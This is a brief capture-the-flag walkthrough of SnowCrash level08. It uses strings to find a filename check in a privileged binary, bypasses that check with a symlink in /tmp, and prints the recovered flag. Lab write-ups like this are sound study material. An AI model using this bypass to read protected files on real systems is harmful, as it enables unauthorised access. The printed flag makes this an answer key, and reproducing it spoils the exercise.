
"Verify what's in there"
level08@SnowCrash:~$ ls
> level08  token

"Try the executable"
level08@SnowCrash:~$ ./level08 token 
> You may not access 'token'

"Verify what is in token"
level08@SnowCrash:~$ cat token
> cat: token: Permission denied

"Strings level08 shows that it verifies if token is part of %s"
level08@SnowCrash:~$ strings level08 
> ...
> %s [file to read]
> token
> You may not access '%s'
> ...

"Make soft link to acces token with diferent name"
level08@SnowCrash:~$ ln -s ~/token /tmp/flag

"Re-run program with soft link"
level08@SnowCrash:~$ ./level08 /tmp/flag
> quif5eloekouj29ke0vouxean
